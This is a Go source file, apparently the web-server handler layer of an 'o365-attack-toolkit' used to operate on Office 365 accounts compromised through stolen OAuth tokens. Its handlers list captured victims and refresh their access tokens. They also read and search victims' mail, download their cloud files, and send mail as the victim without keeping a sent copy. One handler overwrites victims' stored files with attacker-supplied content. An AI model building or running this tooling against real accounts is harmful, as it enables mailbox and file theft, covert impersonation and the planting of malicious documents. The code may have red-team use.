package server

import (
	b64 "encoding/base64"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"o365-attack-toolkit/api"
	"o365-attack-toolkit/database"
	"o365-attack-toolkit/model"
	"os"
	"path/filepath"

	"github.com/gorilla/mux"
)

// This will contain the template functions

func ExecuteTemplate(w http.ResponseWriter, page model.Page, templatePath string) {

	tpl, err := template.ParseFiles("templates/main.html", templatePath)
	if err != nil {
		log.Fatal(err)
	}
	tpl.ExecuteTemplate(w, "layout", page)
}

func ExecuteSingleTemplate(w http.ResponseWriter, page model.Page, templatePath string) {

	tpl, err := template.ParseFiles(templatePath)
	if err != nil {
		log.Println(err)
	}

	err = tpl.Execute(w, page)
	if err != nil {
		log.Println(err)
	}

}

func GetUsers(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Users"
	Page.URL = api.GenerateURL()
	Page.UserList = database.GetUsers()
	ExecuteTemplate(w, Page, "templates/users.html")
}

func GetUserEmails(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Emails"

	vars := mux.Vars(r)
	id := vars["id"]

	Page.Email = id
	Page.EmailList = database.GetEmailsByUser(id)
	ExecuteTemplate(w, Page, "templates/emails.html")
}

func GetAllEmails(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Emails"
	Page.Email = "all"
	Page.EmailList = database.GetAllEmails()
	ExecuteTemplate(w, Page, "templates/emails.html")
}

func SearchUserEmails(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Emails"
	vars := mux.Vars(r)
	user := vars["id"]
	searchKey := r.FormValue("search")
	Page.EmailList = database.SearchUserEmails(user, searchKey)

	Page.Email = user
	ExecuteTemplate(w, Page, "templates/emails.html")
}

func SearchEmails(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}

	searchKey := r.FormValue("search")
	Page.Title = "Search result for " + searchKey

	Page.EmailList = database.SearchEmails(searchKey)
	ExecuteTemplate(w, Page, "templates/emails.html")
}

func GetUserFiles(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Files"

	vars := mux.Vars(r)
	email := vars["email"]

	folderDir := fmt.Sprintf("./downloads/%s", email)
	if _, err := os.Stat(folderDir); err != nil {
		if os.IsNotExist(err) {
			// Create the folder
			w.Write([]byte("No files exist for this user"))
			return
		} else {
			log.Println(err)
		}
	}
	var files []string
	err := filepath.Walk(folderDir, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		files = append(files, filepath.Base(path))
		return nil
	})
	if err != nil {
		w.Write([]byte("No files exist for this user"))

		log.Println(err)
		return
	}

	Page.Email = email
	Page.FileList = files
	ExecuteSingleTemplate(w, Page, "templates/files.html")
	//ExecuteTemplate(w,Page,"templates/files.html")
}

func GetUserFile() {}

func GetAbout(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "About"
	ExecuteTemplate(w, Page, "templates/about.html")
}

func GetEmail(w http.ResponseWriter, r *http.Request) {
	var Page model.Page
	vars := mux.Vars(r)
	emailID := vars["email_id"]
	userMail := vars["id"]
	user := database.GetUser(userMail)
	Page.Mail = api.GetEmailById(user, emailID) //database.GetEmail(email)
	ExecuteSingleTemplate(w, Page, "templates/email.html")
}

//GetLiveMain will give the template
func GetLiveMain(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	Page.Title = "Live Interaction"

	vars := mux.Vars(r)
	Page.User = database.GetUser(vars["id"])

	// Implement a better way for the refreshing
	api.RefreshAccessToken(&Page.User)

	ExecuteTemplate(w, Page, "templates/live.html")
}

//GetLiveEmails will give the template
func GetLiveEmails(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	vars := mux.Vars(r)
	keyword := r.URL.Query().Get("keyword")
	// If keywords is empty it will search with the default keywords
	if keyword == "" {

		Page.User = database.GetUser(vars["id"])
		Page.Title = "Search e-mail"
	} else {

		Page.User = database.GetUser(vars["id"])
		Page.Title = fmt.Sprintf("Search result for : %s", keyword)
		Page.EmailList = api.GetKeywordEmails(Page.User, keyword, false)
	}
	ExecuteTemplate(w, Page, "templates/emails.html")
}

//SendEmail will send an email to a specific address.
func SendEmail(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	vars := mux.Vars(r)

	Page.User = database.GetUser(vars["id"])
	//r.ParseForm()

	if err := r.ParseMultipartForm(5 * 1024); err != nil {
		fmt.Printf("Could not parse multipart form: %v\n", err)

		return
	}

	Page.Title = "Users success"

	email := model.SendEmailStruct{}

	email.Message.Subject = r.FormValue("subject")
	email.Message.Body.ContentType = r.FormValue("contentType")
	email.Message.Body.Content = r.FormValue("message")

	// This code needs fixing .
	emailAddress := model.EmailAddress{Address: r.FormValue("emailtarget")}
	target := model.ToRecipients{EmailAddress: emailAddress}
	recp := []model.ToRecipients{target}
	email.Message.ToRecipients = recp
	email.SaveToSentItems = "false"

	// Parse the File
	file, fileHandler, err := r.FormFile("attachment")
	if err == nil {

		attachment := model.Attachment{}
		attachment.OdataType = "#microsoft.graph.fileAttachment"
		attachment.Name = fileHandler.Filename
		attachment.ContentType = fileHandler.Header["Content-Type"][0]

		// Load the attachment
		attachmentData, _ := ioutil.ReadAll(file)
		encAttachment := b64.StdEncoding.EncodeToString(attachmentData)

		attachment.ContentBytes = encAttachment
		email.Message.Attachments = []model.Attachment{attachment}
		defer file.Close()
	}

	resp, code := api.SendEmail(Page.User, email)
	if code == 202 {
		Page.Message = "E-mail was sent successfully"

		Page.Success = true
	} else {
		Page.Message = resp
	}
	fmt.Println(resp)

	ExecuteTemplate(w, Page, "templates/message.html")
}

//GetLiveEmails will give the template
func GetLiveFiles(w http.ResponseWriter, r *http.Request) {

	Page := model.Page{}
	vars := mux.Vars(r)
	keyword := r.URL.Query().Get("keyword")

	Page.User = database.GetUser(vars["id"])

	if keyword == "" {
		Page.Title = "Last 10 modified files"
		Page.SearchFiles = api.GetKeywordFiles(Page.User, ".", "?$orderby=lastModifiedDateTime&$top=10")
	} else {
		Page.Title = fmt.Sprintf("Search result for : %s", keyword)
		Page.SearchFiles = api.GetKeywordFiles(Page.User, keyword, "?$orderby=lastModifiedDateTime&$top=100")
	}

	ExecuteTemplate(w, Page, "templates/filesearch.html")
}

func DownloadFileHandler(w http.ResponseWriter, r *http.Request) {

	Page := model.Page{}
	vars := mux.Vars(r)

	Page.User = database.GetUser(vars["id"])

	api.LiveDownloadFile(Page.User, vars["fileid"])
	Page.Success = true
	Page.Message = "File Downloaded"
	ExecuteTemplate(w, Page, "templates/message.html")
}

//UpdateFile will send an email to a specific address.
func ReplaceFile(w http.ResponseWriter, r *http.Request) {
	Page := model.Page{}
	vars := mux.Vars(r)

	Page.User = database.GetUser(vars["id"])
	//r.ParseForm()

	if err := r.ParseMultipartForm(5 * 1024); err != nil {
		fmt.Printf("Could not parse multipart form: %v\n", err)
		return
	}

	// Parse the File
	file, fileHeader, _ := r.FormFile("attachment")

	fileContent, _ := ioutil.ReadAll(file)
	fileContentType := fileHeader.Header["Content-Type"][0]
	resp, code := api.UpdateFile(Page.User, vars["fileid"], fileHeader.Filename, fileContent, fileContentType)

	if code == 200 {
		//	Page.Success = true
		Page.Message = "File Updated Successfully"
		Page.Success = true

	} else {
		Page.Message = resp
	}
	ExecuteTemplate(w, Page, "templates/message.html")
}
